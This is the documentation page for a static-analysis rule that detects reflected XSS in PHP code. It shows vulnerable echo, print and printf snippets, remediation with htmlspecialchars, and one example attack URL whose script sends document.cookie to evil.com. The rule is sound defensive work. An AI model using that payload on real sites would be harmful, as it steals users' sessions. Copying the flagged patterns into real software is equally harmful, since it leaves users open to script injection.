---
title: "VNX-PHP-012 – PHP reflected XSS via echo/print of user input"
description: "Detects request input written into the response without HTML encoding: echo, print, <?= ?>, printf() and die()/exit() of a superglobal or a variable read from one, an HTML fragment built with such a value (the $html .= pattern), and an echoed heredoc that interpolates one. Values passed through htmlspecialchars(), htmlentities(), (int) or json_encode() are not reported."
---

## Overview

This rule detects PHP code that passes values from superglobals (`$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`) directly to `echo`, `print`, or `printf` without first encoding HTML special characters. When unsanitised user input is written into an HTML response, the browser interprets it as markup rather than text, allowing attackers to inject `<script>` tags, event handlers, or other HTML that executes JavaScript in the victim's browser.

Reflected XSS occurs when the injected payload is present in the request and reflected in the response in a single round trip. A victim is typically tricked into clicking a crafted link — sent via phishing email, posted on a forum, or distributed through a URL shortener — that triggers the payload. The payload executes in the victim's browser in the context of the vulnerable site, with full access to its cookies, local storage, and DOM.

PHP's `echo` construct and `print()` function perform no output encoding by default. Every instance that outputs user-supplied data without `htmlspecialchars()` is a potential XSS vector.

**Severity:** High | **CWE:** [CWE-79 – Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

## Why This Matters

XSS remains one of the most widespread web vulnerabilities and one of the most versatile. An attacker who achieves JavaScript execution in a victim's browser session can steal the session cookie (if `httpOnly` is not set), capture keystrokes including passwords, redirect the user to a phishing site, silently perform authenticated actions (password change, money transfer, account deletion), and exfiltrate data from the page.

Session theft is particularly damaging because it grants the attacker persistent access to the victim's account without knowing their credentials. Multi-factor authentication is bypassed because the attacker is operating within an already-authenticated session.

PHP codebases that mix HTML and PHP logic are especially prone to scattered `echo $_GET[...]` calls that appear throughout template files. A systematic audit is necessary to find all output sites.

## What Gets Flagged

```php
<!-- FLAGGED: GET param echoed directly into HTML -->
<h1>Welcome, <?php echo $_GET['name']; ?></h1>

<!-- FLAGGED: POST input passed to print() -->
<?php print($_POST['message']); ?>

<!-- FLAGGED: REQUEST data in printf() -->
<?php printf('<p>Search results for: %s</p>', $_REQUEST['q']); ?>

<!-- FLAGGED: short echo inside an attribute -->
<input type="text" name="q" value="<?= $_GET['q'] ?>">
```

```php
// FLAGGED: an HTML buffer built from input, printed later
$html .= '<pre>Hello ' . $_GET['name'] . '</pre>';

// FLAGGED: a variable read from input a few lines above
$name = str_replace('<script>', '', $_GET['name']);
$html .= "<pre>Hello {$name}</pre>";

// FLAGGED: client-controlled $_SERVER keys (headers, PHP_SELF, REQUEST_URI)
echo '<form action="' . $_SERVER['PHP_SELF'] . '">';

// FLAGGED: a heredoc that interpolates input (reported on the echo line)
$name = $_GET['name'];
echo <<<HTML
<h1>Hello $name</h1>
HTML;
```

Not flagged: `htmlspecialchars()`, `htmlentities()`, `strip_tags()`, `(int)`/`intval()`, `json_encode()` and `urlencode()` around the value, `isset()`/`empty()` tests, server-configured keys such as `$_SERVER['SERVER_NAME']`, and input inside a single-quoted literal. A value passed through a second variable before it is echoed, stored XSS and template engines are not tracked.

Attacker payload in the URL:
```
https://example.com/search.php?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

## Remediation

1. **Wrap all user-supplied output in `htmlspecialchars($var, ENT_QUOTES, 'UTF-8')`** — this encodes `<`, `>`, `"`, `'`, and `&` as HTML entities.

2. **Create a short helper function** (e.g., `h()`) that calls `htmlspecialchars` so encoding is concise and consistently applied.

3. **Consider a templating engine** (Twig, Blade, Smarty) that auto-escapes output by default, eliminating the risk of forgetting to encode.

4. **Set a Content-Security-Policy header** as a defence-in-depth measure to limit which scripts can execute even if an XSS payload is injected.

```php
<?php
// Helper for safe HTML output
function h(string $value): string {
    return htmlspecialchars($value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}
?>

<!-- SAFE: all output encoded -->
<h1>Welcome, <?= h($_GET['name']) ?></h1>

<?php
// SAFE: printf with encoded values
printf('<p>Search results for: %s</p>', h($_REQUEST['q']));
?>
```

## References

- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [CAPEC-86: XSS via HTTP Request Headers](https://capec.mitre.org/data/definitions/86.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP PHP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html)
- [PHP Manual – htmlspecialchars()](https://www.php.net/manual/en/function.htmlspecialchars.php)
- [PortSwigger Web Security Academy – Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
